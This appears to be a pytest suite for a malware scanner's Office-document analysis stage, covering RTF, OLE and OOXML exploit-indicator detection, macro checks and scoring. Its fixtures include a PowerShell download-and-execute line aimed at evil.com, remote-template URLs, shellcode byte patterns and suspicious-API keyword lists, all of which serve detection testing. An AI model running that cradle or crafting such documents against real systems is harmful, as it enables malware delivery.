"""Unit tests for DocumentAnalysisStage.

Tests cover:
- Document type detection (RTF, OLE, OOXML, non-document)
- RTF structural scanning and exploit indicator detection
- OLE stream scanning
- OOXML parsing for external relationships and embedded objects
- VBA macro detection
- Artifact extraction and safe filename handling
- Scoring integration (via pipeline._build_analysis_result)
- Edge cases: missing file, oversized file, non-document
"""

import struct
import uuid
import zipfile
from datetime import datetime, timezone
from pathlib import Path

import pytest
from malscan_worker.stages.base import StageContext, StageResult
from malscan_worker.stages.document_analysis import (
    DocumentAnalysisStage,
    _guess_artifact_ext,
    _looks_like_pe,
    _looks_like_shellcode,
    _safe_filename,
    _sha256_bytes,
    detect_document_type,
)

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


def _make_ctx(file_path: Path, original_filename: str = "sample.doc") -> StageContext:
    """Helper to build a minimal StageContext for testing."""
    return StageContext(
        job_id=str(uuid.uuid4()),
        file_id=str(uuid.uuid4()),
        storage_key="deadbeef" * 8,
        sha256="deadbeef" * 8,
        original_filename=original_filename,
        file_path=file_path,
    )


def _make_job_context(file_path: Path, original_filename: str = "sample.doc") -> StageContext:
    ctx = _make_ctx(file_path, original_filename)
    ctx.job = type("Job", (), {"id": uuid.uuid4(), "depth": 0})()
    return ctx


def _make_ctx_with_filetype(
    file_path: Path, mime: str, original_filename: str = "sample.doc"
) -> StageContext:
    """Build a StageContext that already has a file-type stage result."""
    ctx = _make_ctx(file_path, original_filename)
    ctx.previous_results = [
        StageResult(
            stage_name="file-type",
            status="ok",
            started_at=datetime.now(timezone.utc),
            ended_at=datetime.now(timezone.utc),
            duration_ms=1,
            findings={"mime_type": mime, "magic_desc": "test", "file_size": 100},
            artifacts=[],
        )
    ]
    return ctx


# ---------------------------------------------------------------------------
# detect_document_type
# ---------------------------------------------------------------------------


class TestDetectDocumentType:
    def test_rtf_magic(self, tmp_path):
        p = tmp_path / "test.rtf"
        p.write_bytes(b"{\\rtf1 hello world}")
        assert detect_document_type(p, "") == "rtf"

    def test_rtf_with_bom(self, tmp_path):
        p = tmp_path / "test.rtf"
        p.write_bytes(b"\xef\xbb\xbf{\\rtf1 test}")
        assert detect_document_type(p, "") == "rtf"

    def test_ole_magic(self, tmp_path):
        p = tmp_path / "test.doc"
        # OLE Compound File magic + padding
        p.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 4088)
        assert detect_document_type(p, "") == "ole"

    def test_ooxml_magic(self, tmp_path):
        p = tmp_path / "test.docx"
        # Create a minimal OOXML (ZIP) file
        with zipfile.ZipFile(p, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
        assert detect_document_type(p, "") == "ooxml"

    def test_mime_fallback_rtf(self, tmp_path):
        p = tmp_path / "test.dat"
        p.write_bytes(b"not rtf magic bytes at all")
        assert detect_document_type(p, "application/rtf") == "rtf"

    def test_mime_fallback_msword(self, tmp_path):
        p = tmp_path / "test.dat"
        p.write_bytes(b"random data")
        assert detect_document_type(p, "application/msword") == "ole"

    def test_mime_fallback_ooxml(self, tmp_path):
        p = tmp_path / "test.dat"
        p.write_bytes(b"random data")
        assert (
            detect_document_type(
                p, "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
            )
            == "ooxml"
        )

    def test_not_a_document(self, tmp_path):
        p = tmp_path / "test.exe"
        p.write_bytes(b"MZ" + b"\x00" * 100)
        assert detect_document_type(p, "application/x-dosexec") is None

    def test_nonexistent_file(self, tmp_path):
        p = tmp_path / "missing.doc"
        assert detect_document_type(p, "") is None


# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------


class TestHelpers:
    def test_sha256_bytes(self):
        h = _sha256_bytes(b"hello")
        assert len(h) == 64
        assert h == "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"

    def test_safe_filename_strips_path_sep(self):
        name = _safe_filename("../../etc/passwd", 0, ".bin")
        assert "/" not in name
        assert "\\" not in name

    def test_safe_filename_truncates_long_names(self):
        name = _safe_filename("a" * 200, 0, ".bin")
        assert len(name) <= 84  # 80 + len(".bin")

    def test_safe_filename_fallback_on_empty(self):
        name = _safe_filename("", 5, ".exe")
        assert "artifact_5" in name

    def test_looks_like_pe(self):
        assert _looks_like_pe(b"MZ" + b"\x00" * 100)
        assert not _looks_like_pe(b"PK" + b"\x00" * 100)
        assert not _looks_like_pe(b"MZ")  # Too short

    def test_looks_like_shellcode(self):
        # NOP sled
        assert _looks_like_shellcode(b"\x90" * 20 + b"\xcc" * 100)
        # Common shellcode prologue
        assert _looks_like_shellcode(b"\xfc\xe8" + b"\x00" * 100)
        # Normal text
        assert not _looks_like_shellcode(b"Hello world, this is normal text")

    def test_guess_artifact_ext_pe(self):
        assert _guess_artifact_ext(b"MZ" + b"\x00" * 100, "unknown") == ".exe"

    def test_guess_artifact_ext_vbs(self):
        code = b"Dim x\nSub Auto_Open()\nx = 1\nEnd Sub"
        assert _guess_artifact_ext(code, "unknown") == ".vbs"

    def test_guess_artifact_ext_ps1(self):
        code = b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com')"
        assert _guess_artifact_ext(code, "unknown") == ".ps1"

    def test_guess_artifact_ext_by_name(self):
        assert _guess_artifact_ext(b"data", "payload.dll") == ".dll"


# ---------------------------------------------------------------------------
# Stage execution — skip / edge cases
# ---------------------------------------------------------------------------


class TestDocumentAnalysisStageSkip:
    @pytest.mark.asyncio
    async def test_skip_missing_file(self):
        ctx = _make_ctx(Path("/nonexistent/file.doc"))
        stage = DocumentAnalysisStage()
        result = await stage.execute(ctx)
        assert result.status == "skipped"
        assert "File not found" in result.findings["reason"]

    @pytest.mark.asyncio
    async def test_skip_non_document(self, tmp_path):
        p = tmp_path / "test.exe"
        p.write_bytes(b"MZ" + b"\x00" * 200)
        ctx = _make_ctx_with_filetype(p, "application/x-dosexec", "test.exe")
        stage = DocumentAnalysisStage()
        result = await stage.execute(ctx)
        assert result.status == "skipped"
        assert "Not a supported document format" in result.findings["reason"]

    @pytest.mark.asyncio
    async def test_skip_oversized_file(self, tmp_path):
        """Files above 50 MB are skipped."""
        p = tmp_path / "huge.doc"
        # Don't actually write 50MB — mock the stat
        p.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100)
        ctx = _make_ctx(p)

        import malscan_worker.stages.document_analysis as mod

        original = mod.MAX_FILE_SIZE_FOR_PARSE
        mod.MAX_FILE_SIZE_FOR_PARSE = 50  # Artificially low
        try:
            stage = DocumentAnalysisStage()
            result = await stage.execute(ctx)
            assert result.status == "partial"
            assert result.findings["resource_limited"] is True
            assert "too large" in result.findings["reason"]
        finally:
            mod.MAX_FILE_SIZE_FOR_PARSE = original


# ---------------------------------------------------------------------------
# RTF analysis
# ---------------------------------------------------------------------------


class TestRTFAnalysis:
    @pytest.mark.asyncio
    async def test_rtf_basic_control_detection(self, tmp_path):
        """RTF with \\objdata and Equation reference."""
        rtf = b"{\\rtf1 \\objdata 00112233 \\objclass Equation.3 }"
        p = tmp_path / "test.rtf"
        p.write_bytes(rtf)
        ctx = _make_ctx(p, "test.rtf")

        stage = DocumentAnalysisStage()
        result = await stage.execute(ctx)

        assert result.status == "ok"
        assert result.findings["document_type"] == "rtf"

        # Should detect \\objdata and Equation reference
        controls = [
            f["value"] for f in result.findings["parser_findings"] if f.get("type") == "rtf_control"
        ]
        assert any("objdata" in c for c in controls)

        # Should have equation editor indicator
        eq_inds = [
            i
            for i in result.findings["exploit_indicators"]
            if "equation" in i.get("type", "").lower()
        ]
        assert len(eq_inds) > 0

    @pytest.mark.asyncio
    async def test_rtf_external_template_detection(self, tmp_path):
        rtf = b"{\\rtf1 {\\*\\template http://evil.com/template.dotx}}"
        p = tmp_path / "test.rtf"
        p.write_bytes(rtf)
        ctx = _make_ctx(p, "test.rtf")

        stage = DocumentAnalysisStage()
        result = await stage.execute(ctx)

        assert result.status == "ok"
        ext_inds = [
            i for i in result.findings["exploit_indicators"] if i.get("type") == "external_template"
        ]
        assert len(ext_inds) > 0


# ---------------------------------------------------------------------------
# OLE analysis
# ---------------------------------------------------------------------------


class TestOLEAnalysis:
    @pytest.mark.asyncio
    async def test_ole_equation_editor_clsid_detection(self, tmp_path):
        """Craft a minimal OLE-like file with Equation Editor CLSID bytes."""
        # Build raw bytes containing the OLE magic + Equation Editor CLSID
        ole_magic = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
        # Equation Editor 3.0 CLSID in little-endian packed form
        eq_clsid = struct.pack("<IHH", 0x0002CE02, 0x0000, 0x0000)
        eq_clsid += b"\xC0\x00\x00\x00\x00\x00\x00\x46"
        payload = ole_magic + b"\x00" * 500 + eq_clsid + b"\x00" * 500

        p = tmp_path / "test.doc"
        p.write_bytes(payload)
        ctx = _make_ctx(p, "test.doc")

        stage = DocumentAnalysisStage()
        result = await stage.execute(ctx)

        assert result.status == "partial"
        assert result.findings["errors"]
        assert result.findings["document_type"] == "ole"

        eq_inds = [
            i
            for i in result.findings["exploit_indicators"]
            if "equation_editor" in i.get("type", "")
        ]
        assert len(eq_inds) > 0

    @pytest.mark.asyncio
    async def test_ole_dde_detection(self, tmp_path):
        """OLE file with DDE field code."""
        ole_magic = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
        payload = ole_magic + b"\x00" * 100 + b"\x13 DDEAUTO" + b"\x00" * 100

        p = tmp_path / "test.doc"
        p.write_bytes(payload)
        ctx = _make_ctx(p, "test.doc")

        stage = DocumentAnalysisStage()
        result = await stage.execute(ctx)

        assert result.status == "partial"
        assert result.findings["errors"]
        dde_inds = [
            i for i in result.findings["exploit_indicators"] if i.get("type") == "dde_field"
        ]
        assert len(dde_inds) > 0


# ---------------------------------------------------------------------------
# OOXML analysis
# ---------------------------------------------------------------------------


class TestOOXMLAnalysis:
    @pytest.mark.asyncio
    async def test_ooxml_external_relationship(self, tmp_path):
        """OOXML with external template relationship."""
        p = tmp_path / "test.docx"
        with zipfile.ZipFile(p, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr(
                "word/_rels/document.xml.rels",
                '<?xml version="1.0"?>'
                "<Relationships>"
                '<Relationship Id="rId1" '
                'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
                'relationships/attachedTemplate" '
                'Target="http://evil.com/template.dotx" '
                'TargetMode="External"/>'
                "</Relationships>",
            )

        ctx = _make_ctx(p, "test.docx")

        stage = DocumentAnalysisStage()
        result = await stage.execute(ctx)

        assert result.status == "ok"
        assert result.findings["document_type"] == "ooxml"

        ext_inds = [
            i
            for i in result.findings["exploit_indicators"]
            if i.get("type") == "external_relationship"
        ]
        assert len(ext_inds) > 0
        assert "evil.com" in ext_inds[0]["detail"]

    @pytest.mark.asyncio
    async def test_ooxml_vbaproject_detection(self, tmp_path):
        """OOXML with vbaProject.bin → macros found."""
        p = tmp_path / "test.docm"
        with zipfile.ZipFile(p, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr("word/vbaProject.bin", b"\x00" * 50)  # Dummy binary

        ctx = _make_ctx(p, "test.docm")

        stage = DocumentAnalysisStage()
        result = await stage.execute(ctx)

        assert result.status == "ok"
        assert result.findings["macros"]["found"] is True

    @pytest.mark.asyncio
    async def test_ooxml_embedded_ole_object(self, tmp_path):
        """OOXML with embedded OLE object in word/embeddings/."""
        ole_data = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 200
        p = tmp_path / "test.docx"
        with zipfile.ZipFile(p, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr("word/embeddings/oleObject1.bin", ole_data)

        ctx = _make_ctx(p, "test.docx")

        stage = DocumentAnalysisStage()
        result = await stage.execute(ctx)

        assert result.status == "partial"
        assert result.findings["errors"]
        assert len(result.findings["embedded_objects"]) >= 1
        assert result.findings["embedded_objects"][0]["is_ole"] is True
        # Should have extracted the OLE blob as artifact
        assert len(result.findings["extracted_artifacts"]) >= 1


# ---------------------------------------------------------------------------
# Scoring integration
# ---------------------------------------------------------------------------


class TestDocumentScoring:
    """Test document reporting plus canonical format-analysis scoring."""

    def _build_result(self, doc_findings: dict, format_findings: dict | None = None) -> dict:
        """Helper to call _build_analysis_result with document and format findings."""
        from malscan_worker.pipeline import _build_analysis_result

        ctx = StageContext(
            job_id="test",
            file_id="test-file",
            storage_key="abc123",
            sha256="abc123",
            original_filename="test.doc",
            file_path=None,
        )

        results = [
            StageResult(
                stage_name="file-type",
                status="ok",
                started_at=datetime.now(timezone.utc),
                ended_at=datetime.now(timezone.utc),
                duration_ms=1,
                findings={"mime_type": "application/msword", "file_size": 100},
                artifacts=[],
            ),
            StageResult(
                stage_name="clamav",
                status="ok",
                started_at=datetime.now(timezone.utc),
                ended_at=datetime.now(timezone.utc),
                duration_ms=1,
                findings={"infected": False, "threat_name": None},
                artifacts=[],
            ),
            StageResult(
                stage_name="yara",
                status="ok",
                started_at=datetime.now(timezone.utc),
                ended_at=datetime.now(timezone.utc),
                duration_ms=1,
                findings={"matches": []},
                artifacts=[],
            ),
            StageResult(
                stage_name="document-analysis",
                status="ok",
                started_at=datetime.now(timezone.utc),
                ended_at=datetime.now(timezone.utc),
                duration_ms=10,
                findings=doc_findings,
                artifacts=[],
            ),
            StageResult(
                stage_name="format-analysis",
                status="ok",
                started_at=datetime.now(timezone.utc),
                ended_at=datetime.now(timezone.utc),
                duration_ms=10,
                findings=format_findings or {},
                artifacts=[],
            ),
        ]

        return _build_analysis_result("job-1", "file-1", ctx, results, 100)

    def test_clean_document_no_indicators(self):
        report = self._build_result(
            {
                "document_type": "ole",
                "exploit_indicators": [],
                "macros": {"found": False, "auto_exec": False, "suspicious": False, "sources": []},
                "embedded_objects": [],
                "suspicious_keywords": [],
            }
        )
        assert report["verdict"] == "clean"
        assert report["score"] == 0

    def test_equation_editor_exploit(self):
        report = self._build_result(
            {
                "document_type": "rtf",
                "exploit_indicators": [
                    {
                        "type": "equation_editor_ole",
                        "detail": "test",
                        "cves": ["CVE-2017-11882"],
                    }
                ],
                "macros": {"found": False, "auto_exec": False, "suspicious": False, "sources": []},
                "embedded_objects": [],
                "suspicious_keywords": [],
            },
            {
                "analyzer": "office",
                "format_type": "RTF",
                "risk_score": 25,
                "risk_factors": ["equation_editor_ole"],
                "indicators": [
                    {
                        "type": "equation_editor_ole",
                        "severity": "critical",
                        "detail": "test",
                    }
                ],
                "features": {},
            },
        )
        assert report["verdict"] == "suspicious"
        assert report["risk_level"] == "high"
        assert report["score"] == 76

    def test_external_template_injection(self):
        report = self._build_result(
            {
                "document_type": "ooxml",
                "exploit_indicators": [
                    {
                        "type": "external_relationship",
                        "detail": "http://evil.com/template.dotx",
                    }
                ],
                "macros": {"found": False, "auto_exec": False, "suspicious": False, "sources": []},
                "embedded_objects": [],
                "suspicious_keywords": [],
            },
            {
                "analyzer": "office",
                "format_type": "OOXML",
                "risk_score": 15,
                "risk_factors": ["external_relationship"],
                "indicators": [
                    {
                        "type": "external_relationship",
                        "severity": "high",
                        "detail": "http://evil.com/template.dotx",
                    }
                ],
                "features": {},
            },
        )
        assert report["verdict"] == "suspicious"
        assert report["risk_level"] == "medium"
        assert report["score"] == 53

    def test_autoexec_macro_with_suspicious_keywords(self):
        report = self._build_result(
            {
                "document_type": "ole",
                "exploit_indicators": [],
                "macros": {"found": True, "auto_exec": True, "suspicious": True, "sources": []},
                "embedded_objects": [],
                "suspicious_keywords": ["Shell", "CreateObject", "WScript.Shell"],
            },
            {
                "analyzer": "office",
                "format_type": "OLE",
                "risk_score": 11,
                "risk_factors": ["macro_auto_exec"],
                "indicators": [
                    {
                        "type": "macro_auto_exec",
                        "severity": "medium",
                        "detail": "Office document contains auto-exec macros with suspicious APIs",
                    }
                ],
                "features": {},
            },
        )
        assert report["verdict"] == "suspicious"
        assert report["risk_level"] == "medium"
        assert report["score"] == 37

    def test_macro_found_but_benign(self):
        report = self._build_result(
            {
                "document_type": "ole",
                "exploit_indicators": [],
                "macros": {"found": True, "auto_exec": False, "suspicious": False, "sources": []},
                "embedded_objects": [],
                "suspicious_keywords": [],
            },
            {
                "analyzer": "office",
                "format_type": "OLE",
                "risk_score": 3,
                "risk_factors": ["macro_presence"],
                "indicators": [
                    {
                        "type": "macro_presence",
                        "severity": "low",
                        "detail": "Office document contains macros",
                    }
                ],
                "features": {},
            },
        )
        assert report["score"] == 12
        assert report["risk_level"] == "low"
        assert report["verdict"] == "suspicious"

    def test_dde_field(self):
        report = self._build_result(
            {
                "document_type": "ole",
                "exploit_indicators": [{"type": "dde_field", "detail": "test"}],
                "macros": {"found": False, "auto_exec": False, "suspicious": False, "sources": []},
                "embedded_objects": [],
                "suspicious_keywords": [],
            },
            {
                "analyzer": "office",
                "format_type": "OLE",
                "risk_score": 15,
                "risk_factors": ["dde_field"],
                "indicators": [
                    {
                        "type": "dde_field",
                        "severity": "high",
                        "detail": "test",
                    }
                ],
                "features": {},
            },
        )
        assert report["verdict"] == "suspicious"
        assert report["risk_level"] == "medium"
        assert report["score"] == 53

    def test_report_contains_document_analysis_section(self):
        report = self._build_result(
            {
                "document_type": "rtf",
                "exploit_indicators": [],
                "macros": {"found": False, "auto_exec": False, "suspicious": False, "sources": []},
                "embedded_objects": [{"index": 0, "size": 100}],
                "extracted_artifacts": [
                    {"filename": "test.bin", "sha256": "abc", "size": 100, "source": "test"}
                ],
                "suspicious_keywords": [],
                "parser_findings": [],
                "errors": [],
                "sub_jobs_created": 0,
            }
        )
        # The report must include a document_analysis section
        assert "document_analysis" in report["results"]
        da = report["results"]["document_analysis"]
        assert da["document_type"] == "rtf"
        assert da["embedded_objects_count"] == 1
        assert da["extracted_artifacts_count"] == 1


class TestDocumentAnalysisSubmissionControl:
    @pytest.mark.asyncio
    async def test_execute_skips_subjob_submission_when_requested(self, tmp_path, monkeypatch):
        p = tmp_path / "sample.doc"
        p.write_bytes(b"not-used")
        ctx = _make_job_context(p)
        ctx.skip_artifact_submission = True  # type: ignore[attr-defined]

        submit_calls = 0

        async def _fake_submit_artifacts(self, submit_ctx, artifacts):
            del self, submit_ctx, artifacts
            nonlocal submit_calls
            submit_calls += 1
            return 1

        monkeypatch.setattr(
            DocumentAnalysisStage,
            "_submit_artifacts",
            _fake_submit_artifacts,
        )
        monkeypatch.setattr(
            DocumentAnalysisStage,
            "_analyse_ole",
            lambda self, exec_ctx, findings, artifacts, extract_dir: artifacts.append(
                {"path": str(p), "name": "embedded.bin", "origin_path": "embedded.bin"}
            ),
        )
        monkeypatch.setattr(
            DocumentAnalysisStage,
            "_analyse_vba",
            lambda self, exec_ctx, findings: None,
        )
        monkeypatch.setattr(
            "malscan_worker.stages.document_analysis.detect_document_type",
            lambda file_path, mime: "ole",
        )

        stage = DocumentAnalysisStage()
        result = await stage.execute(ctx)

        assert result.status == "ok"
        assert result.findings["sub_jobs_created"] == 0
        assert submit_calls == 0

    @pytest.mark.asyncio
    async def test_submitted_artifacts_keep_original_root_job_id(self, tmp_path, monkeypatch):
        p = tmp_path / "sample.doc"
        p.write_bytes(b"not-used")
        ctx = _make_job_context(p)
        original_root_job_id = str(uuid.uuid4())
        ctx.root_job_id = original_root_job_id  # type: ignore[attr-defined]

        create_calls = []
        submit_calls = []

        async def _fake_create_artifact(**kwargs):
            create_calls.append(kwargs)
            return {"id": "root-artifact" if len(create_calls) == 1 else "child-artifact"}

        class _Submitter:
            async def submit_subjob(self, **kwargs):
                submit_calls.append(kwargs)
                return "subjob-1"

        async def _fake_get_submitter():
            return _Submitter()

        monkeypatch.setattr(
            "malscan_worker.stages.document_analysis.create_artifact",
            _fake_create_artifact,
        )
        monkeypatch.setattr(
            "malscan_worker.stages.document_analysis.InternalJobSubmitter.get_instance",
            _fake_get_submitter,
        )

        stage = DocumentAnalysisStage()
        submitted = await stage._submit_artifacts(
            ctx,
            [{"path": str(p), "name": "embedded.bin", "origin_path": "embedded.bin"}],
        )

        assert submitted == 1
        assert create_calls[0]["root_job_id"] == original_root_job_id
        assert create_calls[1]["root_job_id"] == original_root_job_id
        assert submit_calls[0]["root_job_id"] == original_root_job_id
